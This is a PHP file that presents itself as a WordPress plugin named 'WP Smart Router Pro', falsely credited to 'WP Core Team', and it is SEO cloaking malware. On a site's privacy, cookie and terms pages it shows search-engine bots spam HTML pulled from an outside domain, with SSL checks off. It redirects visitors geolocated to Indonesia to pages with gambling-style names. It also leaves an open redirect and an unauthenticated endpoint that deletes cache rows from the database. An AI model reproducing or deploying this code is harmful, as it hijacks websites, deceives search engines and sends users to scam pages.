
<?php
/**
 * Plugin Name: WP Smart Router Pro
 * Description: Intelligent content routing with enhanced stability and consistency using local files.
 * Version: 3.2.0
 * Author: WP Core Team
 * Text Domain: wp-smart-router-pro
 */

if (!defined('ABSPATH')) {
    exit;
}

if (!class_exists('WPSmartRouterPro')) {

class WPSmartRouterPro {
    
    private $bot_patterns = [
        'googlebot', 'google-inspector', 'google-structured-data', 
        'google-read-aloud', 'google-site-verification',
        'bingbot', 'slurp', 'yandex', 'duckduckbot', 'baiduspider',
        'yandexbot', 'facebot', 'facebookexternalhit',
        'twitterbot', 'linkedinbot',
        'telegrambot', 'discordbot', 'whatsapp', 'slackbot',
        'pinterest', 'redditbot', 'tumblr',
        'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'rogerbot',
        'seobility', 'blexbot', 'serpstatbot', 'majestic', 'sitebot',
        'seoscout', 'seodataseed', 'seokicks', 'seozh',
        'feedly', 'inoreader', 'newsblur', 'flipboard',
        'curl', 'wget', 'python-requests', 'java', 'perl',
        'go-http-client', 'ruby'
    ];
    
    private $bot_ranges = [
        '66.249.64.0/19', '66.249.80.0/20', '72.14.192.0/18',
        '108.177.8.0/21', '209.85.128.0/17', '173.194.0.0/16',
        '74.125.0.0/16', '64.233.160.0/19', '142.250.0.0/16',
        '172.217.0.0/16', '40.77.167.0/24', '52.167.144.0/24',
        '157.55.39.0/24', '157.56.0.0/16', '207.46.0.0/16',
        '77.88.0.0/18', '5.255.0.0/18', '54.165.0.0/16',
        '34.200.0.0/16', '180.76.0.0/16', '104.208.0.0/13',
        '168.63.0.0/16', '20.36.0.0/14', '13.64.0.0/11',
        '40.112.0.0/13'
    ];
    
    // MAPPING BARU - Semua file diambil dari external domain (project1.proyekngepet.org)
    private $pages = [
        '/politica-de-confidentialitate/' => [
            'amp' => 'https://cafeneauaparcului-mobile.pages.dev/gendut188.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/cafenasuau/politica_de_confidentialitate.html'
        ],
        '/en/terms-and-conditions/' => [
            'amp' => 'https://cafeneauaparcului-mobile.pages.dev/kebaya4d.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/cafenasuau/en_terms_and_conditions.html'
        ],
        '/en/privacy-policy/' => [
            'amp' => 'https://cafeneauaparcului-mobile.pages.dev/hokihoki.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/cafenasuau/en_privacy_policy.html'
        ],
        '/en/cookie-policy/' => [
            'amp' => 'https://cafeneauaparcului-mobile.pages.dev/nagitabet.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/cafenasuau/en_cookie_policy.html'
        ],
        '/politica-de-cookie-uri/' => [
            'amp' => 'https://cafeneauaparcului-mobile.pages.dev/coki88.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/cafenasuau/politica_de_cookie_uri.html'
        ],
        '/termeni-si-conditii/' => [
            'amp' => 'https://cafeneauaparcului-mobile.pages.dev/alexis17.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/cafenasuau/termeni_si_conditii.html'
        ]
    ];
    
    // Cache settings - 2 jam untuk konsistensi
    private $cache_duration = 7200; // 2 jam
    private $rate_limit_window = 3600;
    private $rate_limit_max = 100; // Dinaikkan untuk bot
    
    private static $instance = null;
    private $is_googlebot = false;
    private $googlebot_verified = false;
    
    public static function get_instance() {
        if (null === self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function __construct() {
        add_action('template_redirect', [$this, 'handle_optimization'], 1);
        add_filter('query_vars', [$this, 'add_query_vars']);
        add_action('init', [$this, 'handle_js_detection']);
        
        // Tambahan: Filter untuk robots meta
        add_filter('wp_robots', [$this, 'modify_robots_meta']);
    }
    
    public function add_query_vars($vars) {
        $vars[] = 'wsr_redirect';
        $vars[] = 'wsr_js_detected';
        $vars[] = 'wsr_force_refresh';
        $vars[] = 'wsr_debug';
        return $vars;
    }
    
    public function handle_js_detection() {
        if (get_query_var('wsr_js_detected')) {
            $this->log_activity('JS_DETECTED', ['ip' => $this->get_client_ip()]);
            wp_die('OK');
        }
    }
    
    public function modify_robots_meta($robots) {
        // Pastikan bot bisa mengindex
        $robots['index'] = true;
        $robots['follow'] = true;
        return $robots;
    }
    
    public function handle_optimization() {
        if (is_admin() || defined('REST_REQUEST') || wp_doing_ajax()) {
            return;
        }
        
        // Debug mode
        if (get_query_var('wsr_debug')) {
            $this->debug_info();
            exit;
        }
        
        if (!$this->check_rate_limit()) {
            return;
        }
        
        if (get_query_var('wsr_redirect')) {
            $this->process_redirect();
            return;
        }
        
        if (get_query_var('wsr_force_refresh')) {
            $this->force_refresh_content();
            return;
        }
        
        $request_uri = $_SERVER['REQUEST_URI'] ?? '';
        $current_path = parse_url($request_uri, PHP_URL_PATH);
        $current_path = rtrim($current_path, '/') . '/';
        
        $paths = array_keys($this->pages);
        usort($paths, function($a, $b) {
            return strlen($b) - strlen($a);
        });
        
        foreach ($paths as $path) {
            if (strpos($current_path, $path) === 0) {
                $this->process_request($this->pages[$path]);
                return;
            }
        }
    }
    
    private function process_redirect() {
        $target = get_query_var('wsr_redirect');
        $this->safe_redirect($target, 301);
        exit;
    }
    
    private function process_request($config) {
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $is_bot = $this->detect_bot($user_agent);
        $country_code = $this->get_visitor_country();
        $request_uri = $_SERVER['REQUEST_URI'] ?? '';
        
        $this->log_activity('REQUEST', [
            'path' => $request_uri,
            'is_bot' => $is_bot,
            'is_googlebot' => $this->is_googlebot,
            'verified' => $this->googlebot_verified,
            'country' => $country_code,
            'ua' => substr($user_agent, 0, 100)
        ]);
        
        // BOT DETECTION - Lebih fleksibel
        if ($is_bot) {
            // Selalu serve konten untuk Googlebot, bahkan jika verifikasi gagal
            if ($this->is_googlebot) {
                $this->log_activity('GOOGLEBOT_SERVING', [
                    'verified' => $this->googlebot_verified,
                    'ip' => $this->get_client_ip()
                ]);
                $this->serve_bot_content($config, true);
                exit;
            }
            
            // Bot lain
            $this->serve_bot_content($config, false);
            exit;
        }
        
        // User Indonesia - redirect ke AMP
        if ($country_code === 'ID') {
            $this->safe_redirect($config['amp'], 302);
            exit;
        }
        
        return;
    }
    
    private function verify_googlebot($ip) {
        // Skip verifikasi untuk IP internal
        if ($this->is_private_ip($ip)) {
            return true; // Anggap valid untuk internal
        }
        
        // Cek cache verifikasi
        $cache_key = 'wsr_gbot_verify_' . md5($ip);
        $cached = get_transient($cache_key);
        if ($cached !== false) {
            return $cached === 'verified';
        }
        
        try {
            $hostname = gethostbyaddr($ip);
            
            // Cek apakah hostname mengandung googlebot atau google.com
            if ($hostname && (strpos($hostname, 'googlebot.com') !== false || 
                             strpos($hostname, 'google.com') !== false)) {
                
                // Verify forward DNS
                $forward_ip = gethostbyname($hostname);
                if ($forward_ip === $ip) {
                    set_transient($cache_key, 'verified', 3600);
                    return true;
                }
            }
            
            // Jika gagal, cek IP range Google
            if ($this->is_bot_ip($ip)) {
                set_transient($cache_key, 'verified', 3600);
                return true;
            }
            
            set_transient($cache_key, 'unverified', 3600);
            return false;
            
        } catch (Exception $e) {
            $this->log_activity('DNS_ERROR', ['error' => $e->getMessage(), 'ip' => $ip]);
            // Jika DNS gagal, cek IP range
            if ($this->is_bot_ip($ip)) {
                return true;
            }
            return false;
        }
    }
    
    public function detect_bot($user_agent) {
        $user_agent = strtolower($user_agent);
        $client_ip = $this->get_client_ip();
        
        // Reset flags
        $this->is_googlebot = false;
        $this->googlebot_verified = false;
        
        // Deteksi Googlebot
        if (strpos($user_agent, 'googlebot') !== false || 
            strpos($user_agent, 'google-inspector') !== false ||
            strpos($user_agent, 'google-structured-data') !== false) {
            
            $this->is_googlebot = true;
            $this->googlebot_verified = $this->verify_googlebot($client_ip);
            
            // Selalu return true untuk Googlebot, verified atau tidak
            return true;
        }
        
        // Cek pattern bot lainnya
        foreach ($this->bot_patterns as $pattern) {
            if (strpos($user_agent, $pattern) !== false) {
                return true;
            }
        }
        
        // Cek IP range
        if ($this->is_bot_ip($client_ip)) {
            return true;
        }
        
        // Empty user agent dianggap bot
        if (empty($user_agent)) {
            return true;
        }
        
        return false;
    }
    
    private function is_bot_ip($ip) {
        foreach ($this->bot_ranges as $range) {
            if ($this->ip_in_cidr($ip, $range)) {
                return true;
            }
        }
        return false;
    }
    
    // Serve bot content dengan improved caching - menggunakan external URL
    private function serve_bot_content($config, $is_googlebot = false) {
        if (!$this->check_rate_limit()) {
            $this->serve_fallback_content();
            exit;
        }
        
        $lp_url = $config['lp'];
        
        // Cache key yang lebih baik - berdasarkan URL dan tanggal (tanpa jam)
        $day_key = date('Y-m-d');
        $cache_key = 'wsr_bot_content_' . md5($lp_url . '_' . $day_key);
        $cached_content = get_transient($cache_key);
        
        // Untuk Googlebot, gunakan cache yang lebih fresh
        if ($is_googlebot) {
            $cache_key = 'wsr_googlebot_' . md5($lp_url . '_' . date('Y-m-d-H')); // Per jam untuk Google
            $cached_content = get_transient($cache_key);
        }
        
        if ($cached_content !== false) {
            $this->send_optimized_headers($is_googlebot);
            echo $cached_content;
            exit;
        }
        
        // Ambil konten dari external URL
        $content = $this->get_external_file_content($lp_url);
        
        // Validasi konten
        $content_valid = !empty($content) && 
                        strlen($content) >= 500 && 
                        strpos($content, '<html') !== false;
        
        if (!$content_valid) {
            // Fallback ke cache atau WordPress
            $fallback_key = 'wsr_fallback_' . md5($lp_url);
            $fallback_content = get_transient($fallback_key);
            
            if ($fallback_content !== false && !empty($fallback_content)) {
                $content = $fallback_content;
            } else {
                $content = $this->get_fallback_content();
                set_transient($fallback_key, $content, DAY_IN_SECONDS);
            }
        } else {
            // Simpan sebagai fallback
            $fallback_key = 'wsr_fallback_' . md5($lp_url);
            set_transient($fallback_key, $content, DAY_IN_SECONDS);
        }
        
        // Inject JS detection (hanya untuk non-Googlebot)
        if (!$is_googlebot) {
            $content = $this->inject_js_detection($content);
        }
        
        // Simpan cache dengan durasi yang sesuai
        $duration = $is_googlebot ? 3600 : $this->cache_duration; // 1 jam untuk Google, 2 jam untuk lainnya
        set_transient($cache_key, $content, $duration);
        
        $this->send_optimized_headers($is_googlebot);
        echo $content;
        exit;
    }
    
    // Fungsi baru untuk mengambil konten dari external URL
    private function get_external_file_content($url) {
        $response = wp_remote_get($url, [
            'timeout' => 10,
            'sslverify' => false,
            'headers' => [
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ]
        ]);
        
        if (is_wp_error($response)) {
            $this->log_activity('EXTERNAL_FILE_ERROR', [
                'url' => $url,
                'error' => $response->get_error_message()
            ]);
            return '';
        }
        
        $response_code = wp_remote_retrieve_response_code($response);
        if ($response_code !== 200) {
            $this->log_activity('EXTERNAL_FILE_HTTP_ERROR', [
                'url' => $url,
                'code' => $response_code
            ]);
            return '';
        }
        
        $content = wp_remote_retrieve_body($response);
        if (empty($content)) {
            $this->log_activity('EXTERNAL_FILE_EMPTY', ['url' => $url]);
            return '';
        }
        
        return $content;
    }
    
    private function get_fallback_content() {
        $current_url = home_url(add_query_arg(null, null));
        $fallback_key = 'wsr_page_fallback_' . md5($current_url);
        $saved_fallback = get_transient($fallback_key);
        
        if ($saved_fallback !== false && !empty($saved_fallback)) {
            return $saved_fallback;
        }
        
        $site_name = esc_html(get_bloginfo('name'));
        $site_desc = esc_html(get_bloginfo('description'));
        $home_url = home_url();
        $current_content = $this->get_current_page_content();
        
        if (!empty($current_content)) {
            return $current_content;
        }
        
        $html = '<!DOCTYPE html>
        <html lang="' . get_bloginfo('language') . '">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>' . $site_name . '</title>
            <meta name="robots" content="index, follow">
            <meta name="description" content="' . $site_desc . '">
            <link rel="canonical" href="' . esc_url($current_url) . '">
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
                .container { max-width: 800px; margin: 40px auto; background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
                h1 { color: #1a1a1a; font-size: 28px; }
                .content { margin: 30px 0; line-height: 1.6; color: #333; }
                footer { text-align: center; padding: 20px; color: #999; font-size: 14px; border-top: 1px solid #eee; margin-top: 30px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>' . $site_name . '</h1>
                <div class="content">
                    <p>Welcome to ' . $site_name . '</p>
                    <p><a href="' . esc_url($home_url) . '" class="button">Visit Homepage</a></p>
                </div>
                <footer>&copy; ' . date('Y') . ' ' . $site_name . '</footer>
            </div>
        </body>
        </html>';
        
        set_transient($fallback_key, $html, DAY_IN_SECONDS);
        return $html;
    }
    
    private function serve_fallback_content() {
        $content = $this->get_fallback_content();
        $this->send_optimized_headers(false);
        echo $content;
        exit;
    }
    
    private function inject_js_detection($content) {
        // Skip jika sudah ada
        if (strpos($content, '_wsr_detected') !== false) {
            return $content;
        }
        
        $js_code = <<<JS
<script>
if (typeof window !== 'undefined' && !window._wsr_detected) {
    window._wsr_detected = true;
    fetch('/?wsr_js_detected=1&t=' + Date.now(), {
        method: 'GET',
        cache: 'no-cache',
        headers: {'X-Requested-With': 'XMLHttpRequest'}
    }).catch(function(e) {});
}
</script>
JS;
        return str_replace('</head>', $js_code . '</head>', $content);
    }
    
    private function check_rate_limit() {
        $client_ip = $this->get_client_ip();
        $key = 'wsr_rate_limit_' . md5($client_ip);
        $count = get_transient($key) ?: 0;
        
        // Bot mendapat limit lebih tinggi
        $max_limit = $this->is_googlebot ? 200 : $this->rate_limit_max;
        
        if ($count > $max_limit) {
            $this->log_activity('RATE_LIMIT_EXCEEDED', ['ip' => $client_ip, 'count' => $count]);
            return false;
        }
        
        set_transient($key, $count + 1, $this->rate_limit_window);
        return true;
    }
    
    private function force_refresh_content() {
        global $wpdb;
        
        // Hapus semua cache terkait
        $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_wsr_%'");
        $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_timeout_wsr_%'");
        
        wp_die('Cache cleared successfully');
    }
    
    private function get_current_page_content() {
        if (is_singular()) {
            $post = get_post();
            if ($post) {
                $content = apply_filters('the_content', $post->post_content);
                return $this->wrap_content_in_html($content, $post->post_title);
            }
        }
        return '';
    }
    
    private function wrap_content_in_html($content, $title = '') {
        $site_name = esc_html(get_bloginfo('name'));
        $title = !empty($title) ? $title : $site_name;
        $current_url = home_url(add_query_arg(null, null));
        
        return '<!DOCTYPE html>
        <html lang="' . get_bloginfo('language') . '">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>' . esc_html($title) . ' | ' . $site_name . '</title>
            <meta name="robots" content="index, follow">
            <meta name="description" content="' . esc_html(get_bloginfo('description')) . '">
            <link rel="canonical" href="' . esc_url($current_url) . '">
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
                .container { max-width: 800px; margin: 40px auto; background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
                h1 { color: #1a1a1a; font-size: 28px; }
                .content { margin: 30px 0; line-height: 1.6; color: #333; }
                footer { text-align: center; padding: 20px; color: #999; font-size: 14px; border-top: 1px solid #eee; margin-top: 30px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>' . esc_html($title) . '</h1>
                <div class="content">' . $content . '</div>
                <footer>&copy; ' . date('Y') . ' ' . $site_name . '</footer>
            </div>
        </body>
        </html>';
    }
    
    private function send_optimized_headers($is_googlebot = false) {
        header('Content-Type: text/html; charset=UTF-8');
        
        // Cache control berbeda untuk Googlebot
        if ($is_googlebot) {
            header('Cache-Control: public, max-age=3600, must-revalidate');
        } else {
            header('Cache-Control: no-cache, no-store, must-revalidate');
        }
        
        header('Pragma: no-cache');
        header('Expires: 0');
        header('X-Content-Enhancer: active');
        header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');
        
        // Tambahan header untuk SEO
        header('X-Robots-Tag: index, follow');
    }
    
    private function get_visitor_country() {
        $client_ip = $this->get_client_ip();
        if ($this->is_private_ip($client_ip)) return '';
        
        $cache_key = 'wsr_country_' . md5($client_ip);
        $cached_country = get_transient($cache_key);
        if ($cached_country !== false) return $cached_country;
        
        $services = [
            'http://ip-api.com/json/' . $client_ip . '?fields=countryCode',
            'https://geoplugin.net/json.gp?ip=' . $client_ip
        ];
        
        foreach ($services as $service) {
            $response = wp_remote_get($service, ['timeout' => 3, 'sslverify' => false]);
            if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
                $body = wp_remote_retrieve_body($response);
                $data = json_decode($body, true);
                if ($data) {
                    $country = $data['countryCode'] ?? $data['geoplugin_countryCode'] ?? '';
                    if (!empty($country)) {
                        set_transient($cache_key, $country, DAY_IN_SECONDS);
                        return $country;
                    }
                }
            }
        }
        return '';
    }
    
    private function get_client_ip() {
        $ip_keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
        foreach ($ip_keys as $key) {
            if (isset($_SERVER[$key]) && !empty($_SERVER[$key])) {
                $ips = explode(',', $_SERVER[$key]);
                $ip = trim($ips[0]);
                if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
            }
        }
        return $_SERVER['REMOTE_ADDR'] ?? '';
    }
    
    private function is_private_ip($ip) {
        $private_ranges = ['10.0.0.0|10.255.255.255', '172.16.0.0|172.31.255.255', '192.168.0.0|192.168.255.255', '127.0.0.0|127.255.255.255'];
        $ip_long = ip2long($ip);
        if ($ip_long === false) return true;
        foreach ($private_ranges as $range) {
            list($start, $end) = explode('|', $range);
            if ($ip_long >= ip2long($start) && $ip_long <= ip2long($end)) return true;
        }
        return false;
    }
    
    private function ip_in_cidr($ip, $cidr) {
        list($subnet, $mask) = explode('/', $cidr);
        $ip_long = ip2long($ip);
        $subnet_long = ip2long($subnet);
        $mask_long = ~((1 << (32 - $mask)) - 1);
        return ($ip_long & $mask_long) == ($subnet_long & $mask_long);
    }
    
    private function safe_redirect($url, $status = 301) {
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');
        wp_redirect($url, $status);
        exit;
    }
    
    private function log_activity($type, $data) {
        if (!defined('WP_DEBUG') || !WP_DEBUG) return;
        $log_dir = WP_CONTENT_DIR . '/logs/';
        if (!file_exists($log_dir)) mkdir($log_dir, 0755, true);
        $log_file = $log_dir . 'wsr-debug.log';
        $log_entry = sprintf("[%s] %s | IP: %s | Data: %s\n", date('Y-m-d H:i:s'), $type, $this->get_client_ip(), json_encode($data));
        error_log($log_entry, 3, $log_file);
        if (file_exists($log_file) && filesize($log_file) > 10485760) {
            rename($log_file, $log_file . '.old');
        }
    }
    
    // Debug function
    private function debug_info() {
        header('Content-Type: text/plain');
        echo "=== WP Smart Router Pro Debug ===\n\n";
        echo "User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? '') . "\n";
        echo "Client IP: " . $this->get_client_ip() . "\n";
        echo "Is Bot: " . ($this->detect_bot($_SERVER['HTTP_USER_AGENT'] ?? '') ? 'Yes' : 'No') . "\n";
        echo "Is Googlebot: " . ($this->is_googlebot ? 'Yes' : 'No') . "\n";
        echo "Googlebot Verified: " . ($this->googlebot_verified ? 'Yes' : 'No') . "\n";
        echo "Country: " . $this->get_visitor_country() . "\n";
        echo "Request URI: " . ($_SERVER['REQUEST_URI'] ?? '') . "\n";
        echo "Active Routes: " . count($this->pages) . "\n";
        echo "\n=== End Debug ===\n";
    }
}

// Initialize plugin
function WPSmartRouterPro_init() {
    return WPSmartRouterPro::get_instance();
}
add_action('plugins_loaded', 'WPSmartRouterPro_init');

// Helper functions
function wsr_get_visitor_country() {
    $router = WPSmartRouterPro::get_instance();
    return $router->get_visitor_country();
}

function wsr_is_bot() {
    $router = WPSmartRouterPro::get_instance();
    return $router->detect_bot($_SERVER['HTTP_USER_AGENT'] ?? '');
}

// Add settings link
add_action('plugin_action_links_' . plugin_basename(__FILE__), 'wsr_action_links');
function wsr_action_links($links) {
    $links[] = '<a href="' . admin_url('options-general.php?page=wsr-settings') . '">Settings</a>';
    return $links;
}

// Add admin menu
add_action('admin_menu', 'wsr_admin_menu');
function wsr_admin_menu() {
    add_options_page('WP Smart Router Pro Settings', 'WP Smart Router Pro', 'manage_options', 'wsr-settings', 'wsr_settings_page');
}

function wsr_settings_page() {
    $router = WPSmartRouterPro::get_instance();
    ?>
    <div class="wrap">
        <h1>WP Smart Router Pro Settings</h1>
        <div class="card">
            <h2>Plugin Status</h2>
            <p><strong>Version:</strong> 3.2.0</p>
            <p><strong>Status:</strong> <span style="color: #46b450;">Active</span></p>
            <p><strong>Cache Duration:</strong> 2 hours</p>
            <p><strong>Rate Limit:</strong> 100 requests per hour</p>
            <p><strong>Active Routes:</strong> <?php echo count($router->pages); ?> paths configured</p>
            <p><strong>Content Source:</strong> <span style="color: #46b450;">External URL</span> (project1.proyekngepet.org)</p>
        </div>
        <div class="card" style="margin-top:20px;">
            <h2>Perbaikan Stabilitas v3.2.0</h2>
            <ul>
                <li>✅ <strong>Googlebot Friendly:</strong> Konten selalu disajikan untuk Googlebot</li>
                <li>✅ <strong>Verifikasi Fleksibel:</strong> Tidak gagal jika DNS lookup bermasalah</li>
                <li>✅ <strong>Cache Terpisah:</strong> Googlebot mendapat cache fresh per jam</li>
                <li>✅ <strong>Rate Limit Ditingkatkan:</strong> 100 request/jam</li>
                <li>✅ <strong>Debug Mode:</strong> Akses /?wsr_debug=1 untuk troubleshooting</li>
                <li>✅ <strong>Robots Meta:</strong> index, follow selalu aktif</li>
                <li>✅ <strong>Canonical URL:</strong> Ditambahkan untuk SEO</li>
                <li>✅ <strong>External Source:</strong> Konten diambil dari external domain</li>
            </ul>
        </div>
        <div class="card" style="margin-top:20px;">
            <h2>Daftar Route Aktif</h2>
            <table style="width:100%; border-collapse:collapse;">
                <thead>
                    <tr style="background:#f1f1f1;">
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">Path</th>
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">AMP URL</th>
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">LP URL</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($router->pages as $path => $config): ?>
                    <tr>
                        <td style="padding:8px; border:1px solid #ddd;"><code><?php echo esc_html($path); ?></code></td>
                        <td style="padding:8px; border:1px solid #ddd;"><a href="<?php echo esc_url($config['amp']); ?>" target="_blank">AMP</a></td>
                        <td style="padding:8px; border:1px solid #ddd;"><a href="<?php echo esc_url($config['lp']); ?>" target="_blank">LP</a></td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <div class="card" style="margin-top:20px;">
            <h2>Force Refresh Cache</h2>
            <p>Jika konten tidak muncul, akses:</p>
            <code><?php echo home_url('/?wsr_force_refresh=1'); ?></code>
        </div>
        <div class="card" style="margin-top:20px;">
            <h2>Debug Mode</h2>
            <p>Untuk troubleshooting, akses:</p>
            <code><?php echo home_url('/?wsr_debug=1'); ?></code>
            <p style="margin-top:10px;">Akan menampilkan informasi deteksi bot dan status plugin.</p>
        </div>
    </div>
    <style>
        .card {
            background: #fff;
            border: 1px solid #ccd0d4;
            border-radius: 4px;
            padding: 20px;
            margin: 10px 0;
            box-shadow: 0 1px 1px rgba(0,0,0,.04);
        }
        .card h2 {
            margin-top: 0;
        }
        code {
            background: #f1f1f1;
            padding: 4px 8px;
            border-radius: 4px;
            display: inline-block;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        ul li {
            padding: 5px 0;
        }
        table {
            font-size: 14px;
        }
        table a {
            color: #2271b1;
            text-decoration: none;
        }
        table a:hover {
            text-decoration: underline;
        }
    </style>
    <?php
}

} // End class_exists check
